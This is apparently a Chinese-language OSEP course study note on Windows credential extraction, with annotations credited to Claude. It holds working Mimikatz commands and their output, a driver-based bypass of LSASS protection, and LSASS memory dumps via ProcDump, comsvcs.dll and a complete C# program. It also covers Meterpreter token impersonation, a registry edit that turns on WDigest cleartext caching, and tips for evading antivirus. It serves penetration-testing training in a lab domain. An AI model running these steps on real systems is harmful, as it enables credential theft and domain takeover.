---
title: OSEP-13-Mimikatz凭据提取详解
description: '13-Windows凭证 | 01-Mimikatz凭据提取详解'
pubDate: 2026-01-30T00:02:09+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Credential Dumping
---

# Windows凭据提取 - Mimikatz详解

---

## 【Claude的学习建议】

> **Mimikatz是渗透测试中最重要的工具之一！**
>
> 几乎每次域渗透都会用到Mimikatz。它能从Windows内存中提取密码和哈希，是横向移动的关键。
>
> **学习目标**：
> 1. 理解为什么Windows会在内存中缓存密码
> 2. 掌握Mimikatz的基本使用方法
> 3. 了解如何绕过各种保护机制
>
> **给零基础同学的话**：
> Mimikatz的原理很简单：
> - Windows为了方便，会把你的密码（或哈希）存在内存里
> - Mimikatz就是去内存里"偷看"这些密码
> - 有了密码/哈希，就能登录其他电脑
>
> **为什么这很重要？**
> - 拿到一台电脑 → 提取管理员密码
> - 用管理员密码 → 登录其他电脑
> - 重复这个过程 → 最终拿下域控

---

## 概述

本文详细介绍如何使用Mimikatz从Windows系统中提取凭据,包括绕过LSA保护和离线处理技术。

---

## 第一部分:Kerberos认证基础

### 1.1 Kerberos认证流程

```
用户登录
    ↓
AS_REQ (认证请求)
    ↓ 包含时间戳(用用户密码哈希加密)
KDC (密钥分发中心)
    ↓
AS_REP (认证响应)
    ↓ 包含会话密钥 + TGT
用户获得TGT
    ↓
TGS_REQ (票据授予请求)
    ↓ 包含TGT + 目标SPN
KDC
    ↓
TGS_REP (票据授予响应)
    ↓ 包含服务票据
用户访问服务
```

### 1.2 关键概念

| 术语 | 说明 |
|------|------|
| KDC | 密钥分发中心,运行在域控制器上 |
| TGT | 票据授予票据,有效期默认10小时 |
| SPN | 服务主体名称 |
| 会话密钥 | 用于加密后续通信 |

### 1.3 为什么密码哈希会被缓存?

- TGT自动续期需要密码哈希
- 哈希存储在LSASS进程内存中
- 这就是Mimikatz能够提取凭据的原因

> 【Claude的深入解释】
>
> **为什么Windows要缓存密码？**
>
> ```
> 场景：你登录了Windows，然后去访问文件服务器
>
> 如果不缓存密码：
> ├── 每次访问服务器都要输入密码
> ├── 用户体验极差
> └── 没人愿意用
>
> 所以Windows选择缓存：
> ├── 登录时把密码哈希存到内存
> ├── 需要认证时自动使用缓存的哈希
> ├── 用户无感知，体验好
> └── 但是...攻击者可以偷这些哈希！
> ```
>
> **LSASS进程是什么？**
> - LSASS = Local Security Authority Subsystem Service
> - 它是Windows的"安全管家"
> - 所有的密码、哈希、票据都存在它的内存里
> - Mimikatz就是去读LSASS的内存

---

## 第二部分:Mimikatz基础使用

> 【Claude的实战指南】
>
> **Mimikatz最常用的命令**：
>
> | 命令 | 作用 | 使用场景 |
> |------|------|----------|
> | `privilege::debug` | 获取调试权限 | 每次运行Mimikatz都要先执行 |
> | `sekurlsa::logonpasswords` | 提取所有凭据 | 最常用，提取密码和哈希 |
> | `sekurlsa::tickets` | 导出Kerberos票据 | Pass-the-Ticket攻击 |
> | `lsadump::sam` | 导出本地SAM数据库 | 获取本地账户哈希 |
> | `lsadump::dcsync` | 从DC同步哈希 | 域管权限下获取所有哈希 |
>
> **记住这个流程**：
> ```
> 1. 以管理员身份运行Mimikatz
> 2. privilege::debug（获取权限）
> 3. sekurlsa::logonpasswords（提取凭据）
> 4. 记录NTLM哈希
> 5. 用哈希进行Pass-the-Hash攻击
> ```

### 2.1 启用SeDebugPrivilege

```cmd
C:\Tools\Mimikatz> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK
```

**说明:** 需要管理员权限才能启用SeDebugPrivilege

### 2.2 提取缓存凭据

```cmd
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 32785103 (00000000:01f442cf)
Session           : Interactive from 1
User Name         : offsec
Domain            : corp1
Logon Server      : DC01
Logon Time        : 11/18/2019 1:53:44 AM
SID               : S-1-5-21-1364860144-3811088588-1134232237-1106
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : corp1
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
        kerberos :
         * Username : offsec
         * Domain   : CORP1.COM
         * Password : (null)
```

### 2.3 输出解释

| 字段 | 说明 |
|------|------|
| NTLM | NT哈希,可用于Pass-the-Hash |
| SHA1 | SHA1哈希 |
| Password | 明文密码(如果WDigest启用) |

---

## 第三部分:绕过LSA保护

### 3.1 什么是LSA保护?

LSA保护(PPL - Protected Process Light)是Windows的安全机制:
- 防止非授权进程访问LSASS内存
- 即使是SYSTEM权限也无法直接访问

### 3.2 检测LSA保护

```cmd
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

错误码0x00000005表示"访问被拒绝"

### 3.3 使用Mimikatz驱动绕过

**步骤1: 加载驱动**

```cmd
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

**步骤2: 禁用LSASS的PPL保护**

```cmd
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 536 -> 00/00 [0-0-0]
```

**步骤3: 提取凭据**

```cmd
mimikatz # sekurlsa::logonpasswords
```

---

## 第四部分:离线凭据提取

### 4.1 为什么要离线处理?

- 避免在目标机器上运行Mimikatz
- 减少被检测的风险
- 可以在安全环境中分析

### 4.2 方法1: 任务管理器

1. 打开任务管理器
2. 转到"详细信息"选项卡
3. 找到lsass.exe
4. 右键 → "创建转储文件"
5. 复制生成的.dmp文件

### 4.3 方法2: ProcDump

```cmd
C:\Tools\SysInternals>procdump.exe -ma lsass.exe lsass.dmp
```

### 4.4 方法3: 自定义C#程序

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
          IntPtr hFile, int DumpType, IntPtr ExceptionParam,
          IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
          int processId);

        static void Main(string[] args)
        {
            // 获取LSASS进程ID
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            // 打开进程句柄
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);

            // 创建转储文件
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp",
                                                  FileMode.Create);

            // 执行内存转储
            bool dumped = MiniDumpWriteDump(handle, lsass_pid,
                dumpFile.SafeFileHandle.DangerousGetHandle(),
                2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            dumpFile.Close();
        }
    }
}
```

### 4.5 解析转储文件

```cmd
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...
```

**注意:** 解析机器的操作系统和架构必须与目标机器匹配

---

## 第五部分:令牌模拟

### 5.1 什么是令牌?

Windows使用令牌来表示用户的安全上下文:
- **主令牌**: 进程的安全上下文
- **模拟令牌**: 线程临时使用的安全上下文

### 5.2 令牌类型

| 类型 | 说明 |
|------|------|
| 委派令牌 | 可用于网络认证 |
| 模拟令牌 | 只能本地使用 |

### 5.3 使用Meterpreter列出令牌

```
meterpreter > use incognito
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
corp1\admin
corp1\offsec
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
No tokens available
```

### 5.4 模拟令牌

```
meterpreter > impersonate_token corp1\\admin
[+] Delegation token available
[+] Successfully impersonated user corp1\admin

meterpreter > getuid
Server username: corp1\admin
```

---

## 第六部分:启用WDigest

### 6.1 什么是WDigest?

WDigest是一种认证协议,需要明文密码。在Windows 8.1+默认禁用。

### 6.2 启用WDigest

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

### 6.3 效果

启用后,用户下次登录时明文密码会被缓存:

```cmd
mimikatz # sekurlsa::logonpasswords
        wdigest :
         * Username : admin
         * Domain   : corp1
         * Password : P@ssw0rd123!
```

---

## 常见问题

### Q1: Mimikatz被杀软检测怎么办?

1. 使用离线转储方法
2. 使用Invoke-Mimikatz PowerShell版本
3. 使用自定义编译的版本

### Q2: 如何判断LSA保护是否启用?

检查注册表:
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

### Q3: 转储文件很大怎么办?

可以使用压缩工具压缩后传输,或使用comsvcs.dll方法:
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full
```

---

## 练习

1. 使用Mimikatz提取本地缓存凭据
2. 创建LSASS内存转储并离线解析
3. 使用Meterpreter的incognito模块模拟令牌
4. 编写自定义C#程序创建内存转储
